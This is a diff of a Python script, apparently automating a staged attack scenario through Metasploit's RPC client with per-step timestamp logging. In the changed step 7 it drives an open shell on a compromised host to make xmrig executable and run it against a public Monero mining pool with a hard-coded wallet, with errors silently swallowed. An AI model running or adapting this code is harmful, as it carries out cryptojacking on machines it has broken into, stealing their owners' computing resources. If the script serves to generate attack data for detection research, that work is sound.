@@ -17,25 +17,24 @@ def main(argv):
 
     client = MsfRpcClient('kali')
 
-    time.sleep(30)
-    output_time_file_end = 'time_step_6_end.txt'
-    record_timestamp(folder, output_time_file_end)
-    time.sleep(60)
-    
-    
     # start step 7
     output_time_file_start = 'time_step_7_start.txt'
     record_timestamp(folder, output_time_file_start)
     time.sleep(2)
+    
+    try:
+        while client.jobs.list:
+            time.sleep(1)
 
-    while client.jobs.list:
-        time.sleep(1)
-
-    shell = client.sessions.session('3')
-    shell.write('chmod +x ./xmrig')
-    shell.write('timeout 60s ./xmrig --donate-level 4 -o pool.minexmr.com:443 -u '
-                '44Hp1de8CprPz2K74U5ch4VssxZQUDjVrZWtgRScHZo83mb6D6cHfpLZg4zhaT1BvzJe5jdbPLHzqHp4jrx1hP6UHFCgWhN '
-                '-k --tls')
+        shell = client.sessions.session('3')
+        shell.write('chmod +x ./xmrig')
+        shell.write('timeout 60s ./xmrig --donate-level 4 -o pool.minexmr.com:443 -u '
+                    '44Hp1de8CprPz2K74U5ch4VssxZQUDjVrZWtgRScHZo83mb6D6cHfpLZg4zhaT1BvzJe5jdbPLHzqHp4jrx1hP6UHFCgWhN '
+                    '-k --tls')
+    
+    except Exception as e:
+        print(e)
+        pass
 
     time.sleep(60)
 
